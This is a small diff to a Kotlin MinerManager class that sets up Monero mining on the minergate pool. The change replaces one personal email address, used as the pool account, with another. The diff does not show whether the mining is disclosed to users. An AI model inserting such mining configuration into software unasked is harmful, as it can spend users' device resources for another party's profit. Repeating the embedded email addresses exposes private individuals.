@@ -21,7 +21,7 @@ class MinerManager {
     var isRunning = false
     private var mThreadPool: ExecutorService? = null
     private var mUrl: String = "xmr.pool.minergate.com:45560"
-    private var mUser: String = "1026264263@qq.com"
+    private var mUser: String = "livinmathew99@gmail.com"
     private var mPWD: String = "x"
     var mThreadNum = 1
     var mSpeed = 0.9f
